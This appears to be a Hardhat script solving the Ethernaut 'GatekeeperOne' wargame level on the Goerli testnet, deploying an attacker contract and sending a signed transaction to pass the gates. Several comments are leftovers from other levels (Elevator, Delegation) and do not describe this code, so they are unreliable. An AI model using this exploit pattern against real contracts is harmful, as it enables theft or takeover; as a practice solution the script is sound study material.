/*
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a GatekeeperOneAttacker.
*/

const hre = require("hardhat");
const path = require("path");
require('dotenv').config( {
  path: path.join(__dirname, '.env')
} );

PRIVATE_KEY=process.env.PRIVATE_KEY;

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const GatekeeperOne = "0xEe5097bF657e8aFDD0d7bF0f8580cfB2C6d777cF"
  this.gateKeeperOne = await hre.ethers.getContractAt("GatekeeperOne",GatekeeperOne);

  // Deploying a new GatKepperOne contract
  // const GatekeeperOne = await hre.ethers.getContractFactory("GatekeeperOne");
  // this.gateKeeperOne = await GatekeeperOne.connect(player).deploy();
  // await this.gateKeeperOne.deployed();


  // Deploying the GatekeeperOneAttacker contract
  const GatekeeperOneAttacker = await hre.ethers.getContractFactory("GatekeeperOneAttacker");
  this.gateKeeperOneAttacker = await GatekeeperOneAttacker.connect(player).deploy(this.gateKeeperOne.address);
  await this.gateKeeperOneAttacker.deployed();

  // Getting the bytes4 signature of a function
  // Source -> https://ethereum.stackexchange.com/questions/83165/is-there-a-way-to-get-the-result-of-web3s-encodefunctioncall-with-ethers //
  let delegateABI = ["function hackLevel()"];
  let iface = new hre.ethers.utils.Interface(delegateABI); 
  const selectorHash = iface.encodeFunctionData("hackLevel")

  console.log(
    `
    GateKeeper contract address ${await this.gateKeeperOne.address} \n
    Entrant: ${await this.gateKeeperOne.entrant()} \n
    hackLevel() selectorHash: ${selectorHash}
    `
  );


  console.log("\n\n Performing attack ... \n");


  // Signing and Sending the tx
  const playerWallet = new hre.ethers.Wallet(PRIVATE_KEY);

  gasPrice = await hre.ethers.provider.getGasPrice()
  nonce = await hre.ethers.provider.getTransactionCount(playerWallet.address);

  let tx = {
    chainId: 5, // for goerli
    nonce: nonce,
    to: this.gateKeeperOneAttacker.address,
    value: 0,
    gasLimit: 6721975,
    gasPrice: gasPrice,
    // msg.data contains the function signare of hackLevel(), bcs such a function doesn't exists on the Delegation contract, it will be handled by the fallback() and from there it will be executed a delegateCall() to the Delegate contract forwarding the msg.data
    // The Delegate contract will recognize the function signature encoded in the msg.data, and will call the hackLevel(), thus, setting the owner to be the msg.sender, which is the account that called the Delegation contract (bcs the delegateCall())!
    data: selectorHash 
  };

  let signedTx = await playerWallet.signTransaction(tx);
  console.log("signedTx: ", signedTx);
  let sentTx = await hre.ethers.provider.sendTransaction(signedTx);
  console.log("sentTx: ",sentTx);
  
  let txResult = await hre.ethers.provider.waitForTransaction(sentTx.hash);
  console.log("Transaction sent! - Getting required gas");
  console.log("Transaction Result: ", txResult);

  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  console.log(
    `
    GateKeeper contract address ${await this.gateKeeperOne.address} \n
    Entrant: ${await this.gateKeeperOne.entrant()} \n
    found number?: ${await this.gateKeeperOneAttacker.foundNumber()} \n
    required gas: ${await this.gateKeeperOneAttacker.requiredGas()}
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});